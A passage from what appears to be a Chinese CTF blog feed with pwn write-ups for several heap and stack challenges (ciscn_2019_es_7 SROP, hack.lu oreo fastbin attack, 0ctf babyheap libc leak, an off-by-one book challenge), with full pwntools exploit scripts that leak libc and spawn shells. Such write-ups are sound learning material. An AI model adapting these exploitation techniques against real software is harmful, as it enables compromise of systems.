class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./fuck'</span></span><br><span class="line"><span class="comment">#libc_name = ''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'27016'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'quit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'create string'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Pls give string size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'str:'</span>)</span><br><span class="line">p.send(content.ljust(size,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#p.recvuntil('\n')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'quit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'delete string'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'sure?:'</span>)</span><br><span class="line">p.sendline(<span class="string">'yes'</span>)</span><br><span class="line"><span class="comment">#pass PIE</span></span><br><span class="line">create(<span class="number">10</span>,<span class="string">'aaa'</span>)</span><br><span class="line">create(<span class="number">10</span>,<span class="string">'bbb'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">24</span> + p8(<span class="number">0x1A</span>) <span class="comment">#短字节覆盖，将free_ptr变为puts，free时输出本地地址，求得基地址</span></span><br><span class="line">create(len(payload1),payload1)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span> * <span class="number">24</span>)</span><br><span class="line">PIE_1 = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="comment">#由于puts会00截断所以可以多试几次</span></span><br><span class="line">log.success(<span class="string">"PIE_1: "</span>+hex(PIE_1))</span><br><span class="line">num_base = PIE_1 - <span class="number">0xd1A</span>  <span class="comment">#这里刚开始我写的是0x1A,好吧，我是二傻子</span></span><br><span class="line">log.success(<span class="string">"num_base: "</span>+hex(num_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment">#这里同时free掉了两个堆</span></span><br><span class="line">pri_add = num_base + elf.plt[<span class="string">'printf'</span>]</span><br><span class="line">log.info(<span class="string">"pri_add: "</span>+hex(pri_add))</span><br><span class="line">part0 = <span class="string">'aaaa%'</span>+str(<span class="number">21</span>)+<span class="string">'$llp'</span></span><br><span class="line">part0 = part0.ljust(<span class="number">24</span>,<span class="string">'C'</span>)</span><br><span class="line">payload2 = part0 + p64(pri_add)</span><br><span class="line">create(<span class="number">32</span>,payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *printf") #在获取偏移时，断点下在printf处，gdb在这里，就可以进入printf函数，获取栈的情况</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#get:0x7ffff6c95d08</span></span><br><span class="line"><span class="comment">#_IO_file_write+143:0x7ffff6c95d58</span></span><br><span class="line"><span class="comment">#offset =11+10 (10=(0x7ffff6c95d58-0x7ffff6c95d08)/8) 这里是根据调试得到的结果，计算方法</span></span><br><span class="line">p.recvuntil(<span class="string">'aaaa'</span>)</span><br><span class="line">_IO_file_write =int(p.recvuntil(<span class="string">'C'</span>)[:<span class="number">-1</span>],<span class="number">16</span>) - <span class="number">143</span></span><br><span class="line">log.success(<span class="string">"_IO_file_write:"</span> +hex(_IO_file_write))</span><br><span class="line">libc=LibcSearcher(<span class="string">"_IO_file_write"</span>,_IO_file_write)</span><br><span class="line">libc_base = _IO_file_write - libc.dump(<span class="string">'_IO_file_write'</span>)</span><br><span class="line">sys_add = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_add = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload3 = <span class="string">'/bin/sh;'</span>.ljust(<span class="number">24</span>, <span class="string">'A'</span>)+ p64(sys_add) <span class="comment">#这里不知道为啥不能用地址</span></span><br><span class="line">create(<span class="number">32</span>,payload3)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="14、ciscn-2019-es-7"><a href="#14、ciscn-2019-es-7" class="headerlink" title="14、ciscn_2019_es_7"></a>14、ciscn_2019_es_7</h2><p>64位程序，只有系统调用存在，有signturn的后门，即存在使eax赋值的指令</p><p>具体解释在exp中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'25359'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line">read_add =<span class="number">0x4004f1</span></span><br><span class="line">start_add =<span class="number">0x4004ed</span></span><br><span class="line">syscall_add =<span class="number">0x400517</span></span><br><span class="line">signturn_back =<span class="number">0x4004DA</span></span><br><span class="line">payload = <span class="string">'/bin/sh'</span>+<span class="string">"\x00"</span>*<span class="number">9</span>+ p64(read_add)<span class="comment">#调用完vuln函数后回到调用read处</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">stack_add=u64(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">"stack_add:"</span> +hex(stack_add))<span class="comment">#这里获取的是main主函数的栈地址，从汇编上可以看到，在调用                                          vuln函数之前值push了rbp</span></span><br><span class="line"> <span class="comment">#因此ret地址后面的就为rbp(rbp存放着栈地址)</span></span><br><span class="line">p.recv(<span class="number">8</span>)<span class="comment">#从汇编上看write函数只是打印了0x30个字符，所以这是最后8个</span></span><br><span class="line"><span class="comment">#构造srop</span></span><br><span class="line">sigframe = SigreturnFrame()<span class="comment">#这里是pwntools集成的堆srop的应用</span></span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_add - <span class="number">280</span>  <span class="comment"># "/bin/sh" 's addr #通过调试计算得到</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_add</span><br><span class="line">sigframe.rip = syscall_add</span><br><span class="line">payload1 = <span class="string">'/bin/sh/'</span> + <span class="string">'\x00'</span> * <span class="number">8</span> + p64(signturn_back) + p64(syscall_add) + str(sigframe)</span><br><span class="line"><span class="comment">#这里我有点地方不懂，经过调试但就是这样，如果字符串填满后，我们的signturn_back的低两字节就会为00，相当于我们传入的地址往前移动了两位，地址错误，无法getshell，具体是为啥我也不知道</span></span><br><span class="line"><span class="comment">#这里之所以是'\x00' * 8 而不是多加个8，是因为，汇编：rsi, [rsp+buf] 这个buf是固定的相对于rbp位置的偏移，因此输入的地方少了8个字符</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>fastbin-attack 2014 hack.lu oreo </title>
      <link href="/2020/02/11/fastbin-attack%202014%20hack.lu%20oreo%20/"/>
      <url>/2020/02/11/fastbin-attack%202014%20hack.lu%20oreo%20/</url>
      
        <content type="html"><![CDATA[<h1 id="fastbin-attack-2014-hack-lu"><a href="#fastbin-attack-2014-hack-lu" class="headerlink" title="fastbin-attack 2014 hack.lu"></a>fastbin-attack 2014 hack.lu</h1><a id="more"></a><p>这应该是我能看得懂的第一个堆类题目了</p><p>首先checksec</p><p><a href="https://imgchr.com/i/1sOZtS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/05/1sOZtS.png" alt="1sOZtS.png"></a></p><p>还可</p><p>看程序</p><p>[<img src="https://s2.ax1x.com/2020/02/05/1sOefg.png" alt="1sOefg.png"></p><p>大体来说有三个功能</p><p>1.add</p><p>2.show_add</p><p>3.order</p><p>4.msg</p><p>5.show_stats</p><p>6.exit</p><p>先看add</p><p>[<img src="https://s2.ax1x.com/2020/02/05/1sOnpQ.png" alt="1sOnpQ.png"></p><p>这里我们调试一下</p><p>发现我们输入的是一个结构体</p><p>dword_804A288代表堆地址我们成为tmp_heap</p><p>tmp_heap+13 实际上是 +52个字节，这里放置的是上一个heap的地址，即last_heap</p><p>然后tmp_heap后面的25个字节后放name</p><p>在tmp_heap后面放description</p><p>fgets存在溢出，我们可以输入的字节为56个，我们可以通过name来覆盖掉last_heap的地址，然后通过show_add()来泄露libc基地址</p><p>同时0x804a2a4位置内容加一</p><p>且我们可以看到0x804a2a8存放了0x804a2c0的地址</p><p>图床不好，，先不放图。。抱歉</p><h3 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h3><p>我们先泄露出libc的基地址</p><p>我们name输入‘a’*27之后，在输入就会覆盖掉last_heap</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">name = <span class="string">'a'</span> * <span class="number">27</span> + p32(puts_got)</span><br><span class="line">add(name,<span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">show_add()</span><br><span class="line">p.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">puts_add = p.recv(<span class="number">4</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>)</span><br><span class="line">libc = LibcSearcher(puts,int(puts_add))</span><br><span class="line">libc_add = puts_add - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_add = libc_add + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">str_bin_sh = libc_add + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br></pre></td></tr></table></figure><h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>要在bss段上分配堆，首先需要堆上有合适的size以满足malloc(0x38)的条件。这里我们需要的size为0x40，这是因为我们的数据结构的内容大小为0x38，因此整个chunk的size就为0x40。而如果data段是从0x0804a2a8开始，那么size就位于0x0804a2a8-4=0x0804a2a4处，观察一下这里刚好是number的地址，number的地址就为我们构造堆的大小的位置，因此我们就需要在分配到0x0804a2a8前添加0x40次。</p><p>所以我们先申请0x40-2次，因为我们之前已经申请了一次，并且这些的last_heap腰腹改为\x00且最后一个我们的last_heap为0x804a2a8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fake chunk</span></span><br><span class="line">name1 = <span class="string">'a'</span> * <span class="number">27</span> + p32(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x3e</span>):</span><br><span class="line">add(name1,<span class="string">'a'</span> * <span class="number">25</span>)</span><br><span class="line">name2 = <span class="string">'a'</span> * <span class="number">27</span> + p32(<span class="number">0x0804a2a8</span>)</span><br><span class="line">add(name2,<span class="string">'a'</span> * <span class="number">25</span>)</span><br></pre></td></tr></table></figure><p>之后我们需要绕过next_chunksize的检查</p><p>刚才我们知道0x804a2a8存放了0x804a2c0的地址</p><p>并且根据源码可知，我们的msg通过这个地址放入到了0x804a2c0处</p><p>我们的fake_chunk从0x804a2a8开始</p><p>所以长度为：0x38-(0x804a2c0-0x804a2a8)=0x20</p><p>这里的last_chunk也要设置为0000防止出现再free</p><p>并且还要设置大小，这个大小很随意，符合条件即可</p><p>所以有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#我们需要绕过next_chunksize的检查</span></span><br><span class="line">payload = <span class="string">'\x00'</span> * <span class="number">0x20</span> + <span class="string">'\x00'</span> * <span class="number">4</span> + p32(<span class="number">100</span>)</span><br><span class="line">msg(payload)</span><br></pre></td></tr></table></figure><p>之后free掉就可以</p><p>之后我们看一下链表</p><p>发现fastbin空闲链表中有我们的伪造的链表0x804a2a0 data区域位0x804a2a0 + 8 = 0x804a2a8</p><h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p>最后就是getshell的步骤，即劫持got地址</p><p>因为我们每次的输入都会执行到刚开始输入action的时候，那是都会执行__isoc99_sscanf这个函数</p><p>所以我们劫持他的got地址即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'submitted!\n'</span>)</span><br><span class="line">payload1 = elf.got[<span class="string">'__isoc99_sscanf'</span>]</span><br><span class="line">add(<span class="string">'a'</span>,payload1)</span><br><span class="line">msg(p32(system_add)+<span class="string">';/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#p.sendline('/bin/sh\x00')</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[<img src="https://s2.ax1x.com/2020/02/05/1sOK6s.png" alt="1sOK6s.png"></p><p>显而易见，这里get一个新的bin/方法</p><p>这里有个新姿势：system(“ls;/bin/sh”)就相当于sytem(“ls”);system(“/bin/sh”);分号代表system函数将这个参数分成两部分，先后执行里面的命令。因此这里在fgets函数篡改了strlen_got后紧接着调用strlen，就相当于system(p32(system_addr);”/bin/sh”) = system(p32(system_addr));system(“/bin/sh”);</p><p>这样就能实现最终目的了。</p><p>完成，耗时三天，撒花0.0</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>通过2017 0ctf babyheap 学习unsortbin泄露libc地址</title>
      <link href="/2020/02/11/%E9%80%9A%E8%BF%872017%200ctf%20babyheap%20%E5%AD%A6%E4%B9%A0unsortbin%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80/"/>
      <url>/2020/02/11/%E9%80%9A%E8%BF%872017%200ctf%20babyheap%20%E5%AD%A6%E4%B9%A0unsortbin%E6%B3%84%E9%9C%B2libc%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="通过2017-0ctf-babyheap-学习unsortbin泄露libc地址"><a href="#通过2017-0ctf-babyheap-学习unsortbin泄露libc地址" class="headerlink" title="通过2017 0ctf babyheap 学习unsortbin泄露libc地址"></a>通过2017 0ctf babyheap 学习unsortbin泄露libc地址</h1><a id="more"></a><h2 id="注意一下top-chunk"><a href="#注意一下top-chunk" class="headerlink" title="注意一下top chunk"></a>注意一下top chunk</h2><p>一、top chunk</p><pre><code>当我们分配一块堆内存时，top chunk是出于地址的最高处的，其前面就是我们所申请的chunk</code></pre><p>二、top chunk的合并操作</p><pre><code>如果top chunk前面的chunk不是fast chunk并且处于空闲，那么top chunk就会合并这个chunk如果top chunk前面的chunk是fast chunk，不论是否空闲，top chunk都不会合并这个chunk</code></pre><p>线上一下leak部分代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leek libc</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=0</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=1</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=2</span></span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#index=3</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#index=4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#这两个free将1，2放入fastbin 链表中，使得可以修改链表中index=1的地址（通过修改fd）</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload1)<span class="comment">#这里就是通过修改fd指针来修改fastbin链表</span></span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload2)<span class="comment">#修改一下大小使得可以通过机制</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">0x10</span>)<span class="comment">#这里第一个申请的是之前的index=2，第二个申请的堆的地址是我们伪造的地址，与index=4的地址相同</span></span><br><span class="line"></span><br><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload3)<span class="comment">#这里的话是将大小修改过来，为之后的放入unsort bin做准备</span></span><br><span class="line">create(<span class="number">0x80</span>)<span class="comment">#这里是为了防止top chunk合并free的small bin（index=4）看本文开头</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line"><span class="comment">#p.recvuntil('\x00' * 0x)</span></span><br><span class="line">main_arena = u64(p.recv(<span class="number">8</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"main_arena: "</span>+hex(main_arena))<span class="comment">#这里就泄露出来了</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x7fffff3f4b78</span> - <span class="number">88</span> - <span class="number">0x7fffff030000</span></span><br><span class="line"><span class="comment">#这里是根据本机计算出的offset，offset是恒定不变的</span></span><br><span class="line">log.info(<span class="string">"offset: "</span>+hex(offset))</span><br><span class="line">libc_base = main_arena - <span class="number">88</span> -offset</span><br><span class="line">log.success(<span class="string">"libc_base: "</span>+hex(libc_base))</span><br></pre></td></tr></table></figure><p>正向思考：</p><p>1.我们发现存在dump函数可以输出一个堆中的数据，那么我们就思考怎样将一个堆内容设置为可以泄露libc的地址</p><p>2.通过观察我们可以发现这里存在一个堆溢出，可以尝试使用unsort bin泄露libc</p><p>我们需要一个可以在free后放入unsort bin的堆，并且需要将另一个堆的地址覆盖为，这个放入unsort bin的地址，我们发现可以通过堆溢出进行最低字节的覆盖，由于在申请堆空间的时候，会有一个检查堆大小是否与当前位置大小对应的机制，所以我们在 free后再次申请的时候，需要将那个空间大的堆的大小修改一下，申请完可以再修改回来</p><p>3.之后我们free掉small bin，然后读取就可以了。</p><p>具体解释在exp中</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>off by one</title>
      <link href="/2020/02/09/off%20by%20one/"/>
      <url>/2020/02/09/off%20by%20one/</url>
      
        <content type="html"><![CDATA[<h1 id="off-by-one例题：book"><a href="#off-by-one例题：book" class="headerlink" title="off by one例题：book"></a>off by one例题：book</h1><a id="more"></a><p>这里我们需要简单介绍一下<code>__free_hook</code>函数<br> 当调用free函数的时候当__free_hook内容不为NULL时，会优先执行其内容，所以我们将该函数参数设置为system，就可以实现getshell</p><h2 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h2><p>题目是一个常见的选单式程序，功能是一个图书管理系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br></pre></td></tr></table></figure><p>程序提供了创建、删除、编辑、打印图书的功能。题目是64位程序，保护如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : No</span><br><span class="line">NX                            : Yes</span><br><span class="line">PIE                           : Yes</span><br><span class="line">Fortify                       : No</span><br><span class="line">RelRO                         : Full</span><br></pre></td></tr></table></figure><h3 id="create"><a href="#create" class="headerlink" title="create"></a>create</h3><p>book结构中存在name和description，name和description在堆上分配。首先分配name buffer，使用malloc，大小自定但小于32。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;\nEnter book name size: &quot;, *(_QWORD *)&amp;size);</span><br><span class="line">__isoc99_scanf(&quot;%d&quot;, &amp;size);</span><br><span class="line">printf(&quot;Enter book name (Max 32 chars): &quot;, &amp;size);</span><br><span class="line">ptr &#x3D; malloc(size);</span><br></pre></td></tr></table></figure><p>之后分配description，同样大小自定但无限制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;\nEnter book description size: &quot;, *(_QWORD *)&amp;size);</span><br><span class="line">        __isoc99_scanf(&quot;%d&quot;, &amp;size);</span><br><span class="line"></span><br><span class="line">v5 &#x3D; malloc(size);</span><br></pre></td></tr></table></figure><p>之后分配book结构的内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">book &#x3D; malloc(0x20uLL);</span><br><span class="line">if ( book )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)book + 6) &#x3D; size;</span><br><span class="line">    *((_QWORD *)off_202010 + v2) &#x3D; book;</span><br><span class="line">    *((_QWORD *)book + 2) &#x3D; description;</span><br><span class="line">    *((_QWORD *)book + 1) &#x3D; name;</span><br><span class="line">    *(_DWORD *)book &#x3D; ++unk_202024;</span><br><span class="line">    return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>程序编写的read函数存在null byte off-by-one漏洞，仔细观察这个read函数可以发现对于边界的考虑是不当的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall my_read(_BYTE *ptr, int number)</span><br><span class="line">&#123;</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+14h] [rbp-Ch]</span><br><span class="line">  _BYTE *buf; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( number &lt;&#x3D; 0 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  buf &#x3D; ptr;</span><br><span class="line">  for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)read(0, buf, 1uLL) !&#x3D; 1 )</span><br><span class="line">      return 1LL;</span><br><span class="line">    if ( *buf &#x3D;&#x3D; &#39;\n&#39; )</span><br><span class="line">      break;</span><br><span class="line">    ++buf;</span><br><span class="line">    if ( i &#x3D;&#x3D; number )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf &#x3D; 0;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据调试已经ida静态查看，我们发现有如下结构体book</p><p>struct book:</p><p>​    id;</p><p>​    *name</p><p>​    *description</p><p>​    size</p><h3 id="1-泄漏"><a href="#1-泄漏" class="headerlink" title="1.泄漏"></a>1.泄漏</h3><p>因为程序中的my_read函数存在null byte  off-by-one，事实上my_read读入的结束符’\x00’是写入到0x555555756060的位置的。这样当0x555555756060～0x555555756068写入book指针时就会覆盖掉结束符’\x00’，所以这里是存在一个地址泄漏的漏洞。通过打印author name就可以获得pointer array中第一项的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x555555756040: 0x6161616161616161  0x6161616161616161</span><br><span class="line">0x555555756050: 0x6161616161616161  0x6161616161616161   &lt;&#x3D;&#x3D; author name</span><br><span class="line">0x555555756060: 0x0000555555757480 &lt;&#x3D;&#x3D; pointer array    0x0000000000000000</span><br><span class="line">0x555555756070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555756080: 0x0000000000000000  